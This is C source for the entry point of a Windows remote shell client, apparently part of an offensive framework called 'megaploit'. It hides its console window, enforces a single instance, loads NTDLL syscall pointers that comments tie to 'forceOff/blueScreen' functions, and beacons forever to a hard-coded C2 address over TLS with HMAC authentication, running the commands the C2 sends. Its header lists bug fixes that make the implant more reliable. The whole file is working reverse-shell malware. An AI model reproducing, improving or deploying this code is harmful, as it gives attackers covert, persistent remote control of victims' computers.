/*
 * client/main.c  –  WinMain entry point for the remote shell client
 * ==================================================================
 * Responsibilities:
 *   1. Enforce single-instance via a named mutex.
 *   2. Load NTDLL syscall pointers (ntcalls_load / ntcalls_verify).
 *   3. Hide the console window.
 *   4. Initialise Winsock 2.2.
 *   5. Load the 32-byte HMAC shared secret from disk.
 *   6. Loop forever: TCP connect → TLS + HMAC + v2 handshake → shell loop.
 *      On any failure, clean up and retry after RECONNECT_DELAY_SEC.
 *
 * Fixes vs. original Source.c
 * ----------------------------
 *   BUG 1  CreateMutexA() was passed L"consoleShell" (wide literal) — type
 *           mismatch with the ANSI variant; now a narrow string literal.
 *   BUG 2  WSAStartup MAKEWORD(2,0) → MAKEWORD(2,2).
 *   BUG 3  ntdll LoadLibrary return unchecked.
 *   BUG 4  GetConsoleWindow() return unchecked before ShowWindow.
 *   BUG 5  inet_addr() is deprecated and cannot parse modern addresses; now
 *           uses InetPtonA() (ws2tcpip) which handles both IPv4 and IPv6.
 *   BUG 6  Inner connect-retry loop closed the socket only on TLS failure —
 *           if WSAGetLastError() was WSAETIMEDOUT the socket was leaked.
 *           Now the socket is recreated fresh each time connect() fails.
 *   BUG 7  SecureZeroMemory(secretKey) was inside an infinite loop after
 *           `while(1)` — unreachable dead code.  The key is now wiped
 *           immediately after the TLS context is initialised each iteration
 *           so it never sits in a local variable beyond what's needed.
 */

#include "config.h"
#include "ntcalls.h"
#include "shell.h"
#include "../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>


/* ── Load the 32-byte HMAC key from disk ────────────────────────────────── */
/*                                                                            */
/*  secret.key must contain exactly 64 ASCII hex characters (lower or upper  */
/*  case, with or without a trailing newline).  This is the format written    */
/*  by megaploit.core.crypto when it calls:                                   */
/*      open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))       */
/*  The 64 hex chars decode to the 32 raw bytes used for HMAC-SHA256.        */

static BOOL load_secret_key(const char *path, BYTE key[SECRET_KEY_LEN])
{
    FILE *f = fopen(path, "rb");
    if (!f) return FALSE;

    /* Read 64 hex chars + optional whitespace + 1 safety byte */
    char hex[68] = {0};
    size_t n = fread(hex, 1, sizeof(hex) - 1, f);
    fclose(f);

    /* Strip trailing whitespace / newlines */
    while (n > 0 && (hex[n-1] == '\n' || hex[n-1] == '\r' ||
                      hex[n-1] == ' '  || hex[n-1] == '\t'))
        hex[--n] = '\0';

    if (n != 64) return FALSE;   /* must be exactly 64 hex digits */

    for (int i = 0; i < 32; i++) {
        char hi = hex[i * 2];
        char lo = hex[i * 2 + 1];
        BYTE h, l;

        if      (hi >= '0' && hi <= '9') h = (BYTE)(hi - '0');
        else if (hi >= 'a' && hi <= 'f') h = (BYTE)(hi - 'a' + 10);
        else if (hi >= 'A' && hi <= 'F') h = (BYTE)(hi - 'A' + 10);
        else return FALSE;

        if      (lo >= '0' && lo <= '9') l = (BYTE)(lo - '0');
        else if (lo >= 'a' && lo <= 'f') l = (BYTE)(lo - 'a' + 10);
        else if (lo >= 'A' && lo <= 'F') l = (BYTE)(lo - 'A' + 10);
        else return FALSE;

        key[i] = (BYTE)((h << 4) | l);
    }
    return TRUE;
}


/* ── WinMain ────────────────────────────────────────────────────────────── */

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                     LPCSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrev; (void)lpCmdLine; (void)nCmdShow;

    /* ── 1. Single-instance guard ─────────────────────────────────────── */
    /* BUG 1: was CreateMutexA(NULL, NULL, L"consoleShell")               */
    CreateMutexA(NULL, FALSE, "consoleShell");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* ── 2. NT syscall pointers ──────────────────────────────────────── */
    /* BUG 3: return value was unchecked                                  */
    if (!ntcalls_load()) return 0x02;
    ntcalls_verify();  /* non-fatal; only forceOff/blueScreen need it    */

    /* ── 3. Hide console window ──────────────────────────────────────── */
    /* BUG 4: GetConsoleWindow() return was not NULL-guarded             */
    AllocConsole();
    HWND hConsole = GetConsoleWindow();
    if (hConsole) ShowWindow(hConsole, SW_HIDE);

    /* ── 4. Winsock 2.2 ──────────────────────────────────────────────── */
    /* BUG 2: was MAKEWORD(2,0)                                          */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0x03;

    /* ── 5. Load shared secret ───────────────────────────────────────── */
    BYTE secretKey[SECRET_KEY_LEN];
    if (!load_secret_key(SECRET_KEY_PATH, secretKey)) {
        WSACleanup();
        return 0x01;
    }

    /* ── 6. Reconnect loop ───────────────────────────────────────────── */
    while (1) {

        /* BUG 6: a new socket must be created on every outer iteration.
         * The old code created the socket once outside the inner retry
         * loop, so a failed connect() that consumed the socket (e.g.
         * WSAETIMEDOUT on some stacks) would leak it.                   */
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(C2_PORT);

        /* BUG 5: inet_addr() is deprecated, rejects IPv6, and returns
         * INADDR_NONE for "255.255.255.255" without any error indicator.
         * InetPtonA handles both IPv4 and IPv6 correctly.               */
        if (InetPtonA(AF_INET, C2_IP, &addr.sin_addr) != 1) {
            /* C2_IP is a compile-time constant; if it fails here the
             * build itself is misconfigured — exit rather than loop.   */
            closesocket(sock);
            WSACleanup();
            return 0x04;
        }

        /* Retry TCP connect; recreate socket on each failure to avoid
         * using a socket that may have been put into an error state.   */
        while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            /* BUG 6 fix: close and recreate the socket before retrying */
            closesocket(sock);
            Sleep(RECONNECT_DELAY_SEC * 1000);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock == INVALID_SOCKET) {
                /* Keep retrying; socket() will succeed once resources free */
                Sleep(RECONNECT_DELAY_SEC * 1000);
                /* Re-enter the while(connect) with INVALID_SOCKET —
                 * connect() will fail immediately, loop will retry.    */
            }
        }

        if (sock == INVALID_SOCKET) {
            Sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        /* TLS handshake + HMAC auth + protocol v2 negotiation */
        TLS_CONTEXT tls;
        ZeroMemory(&tls, sizeof(tls));
        if (!tls_connect(&tls, sock, C2_IP, secretKey)) {
            closesocket(sock);
            Sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        /* BUG 7: wipe the key immediately after seeding the TLS context
         * so it does not linger in the stack frame for the rest of the
         * session duration.  tls_connect() copies it into sessionKey.  */
        SecureZeroMemory(secretKey, sizeof(secretKey));

        /* Shell command loop — blocks until the C2 disconnects or
         * sends "exit" / "q".  shell_run() calls tls_disconnect()
         * and WSACleanup() internally on a clean exit verb.           */
        shell_run(&tls);

        /* Defensive cleanup for the case where shell_run() returns
         * due to a recv() failure (connection dropped) rather than a
         * clean "exit" command — tls_disconnect is idempotent.       */
        tls_disconnect(&tls);
        closesocket(sock);

        /* Reload the secret key for the next connection attempt */
        if (!load_secret_key(SECRET_KEY_PATH, secretKey)) {
            /* Key file was deleted or corrupted while we were running;
             * give up rather than connect with a garbage key.         */
            WSACleanup();
            return 0x01;
        }

        Sleep(RECONNECT_DELAY_SEC * 1000);
    }

    /* Unreachable; WSACleanup / SecureZeroMemory called above */
}
